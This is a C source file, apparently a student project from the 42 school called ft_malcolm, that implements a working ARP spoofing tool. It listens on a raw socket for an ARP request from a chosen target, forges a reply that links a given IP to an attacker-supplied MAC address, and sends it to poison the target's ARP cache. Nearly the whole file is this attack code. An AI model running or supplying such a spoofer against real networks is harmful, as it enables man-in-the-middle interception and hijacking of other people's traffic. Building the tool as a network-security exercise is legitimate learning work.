/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   ft_malcolm.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: cclaude <cclaude@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/09/01 18:43:59 by cclaude           #+#    #+#             */
/*   Updated: 2021/09/11 20:26:21 by cclaude          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ft_malcolm.h"

void my_mac (unsigned char *addr, int ifindex)
{
	struct ifaddrs *ifaddr;
	struct ifaddrs *ifa;

	getifaddrs(&ifaddr);
	ifa = ifaddr;
	while (ifa && ((struct sockaddr_ll *)ifa->ifa_addr)->sll_ifindex != ifindex)
		ifa = ifa->ifa_next;

	memcopy(addr, ((struct sockaddr_ll *)ifa->ifa_addr)->sll_addr, 6);
	freeifaddrs(ifaddr);
}

void edit_packet (struct ethhdr *eth, struct ether_arp *arp, char **av, int ifindex)
{
	// printf("ARP Request :\n");
	// print_arp(eth, arp);

	my_mac(eth->h_source, ifindex);
	fill_mac(eth->h_dest, av[4]);

	arp->ea_hdr.ar_op = htons(ARPOP_REPLY);
	*(unsigned int *)arp->arp_spa = inet_addr(av[1]);
	fill_mac(arp->arp_sha, av[2]);
	*(unsigned int *)arp->arp_tpa = inet_addr(av[3]);
	fill_mac(arp->arp_tha, av[4]);

	// printf("Modified buffer (ARP Reply) :\n");
	// print_arp(eth, arp);
}

int main (int ac, char **av)
{
	if (error_check(ac, av))
		return (1);

	int packet_socket;
	char packet[1000] = {0};
	struct sockaddr_ll addr = {0};
	socklen_t addrlen = sizeof(addr);
	struct ethhdr *eth;
	struct ether_arp *arp;

	packet_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

	while (1)
	{
		recvfrom(packet_socket, packet, 1000, 0, (struct sockaddr *)&addr, &addrlen);

		eth = (struct ethhdr *)packet;
		arp = (struct ether_arp *)(packet + ETHER_HDR_LEN);

		if (ntohs(eth->h_proto) == ETH_P_ARP && ntohs(arp->ea_hdr.ar_op) == ARPOP_REQUEST
		&& *(unsigned int *)arp->arp_tpa == inet_addr(av[1]) && *(unsigned int *)arp->arp_spa == inet_addr(av[3]))
			break ;
	}

	printf("Received ARP Request from target !\n\n");

	edit_packet(eth, arp, av, addr.sll_ifindex);

	sendto(packet_socket, packet, ETHER_HDR_LEN + ETHER_ARP_LEN, 0, (struct sockaddr *)&addr, sizeof(struct sockaddr_ll));

	printf("Sent spoofed ARP Reply, check ARP table on target !\n\n");

	close(packet_socket);

	return (0);
}
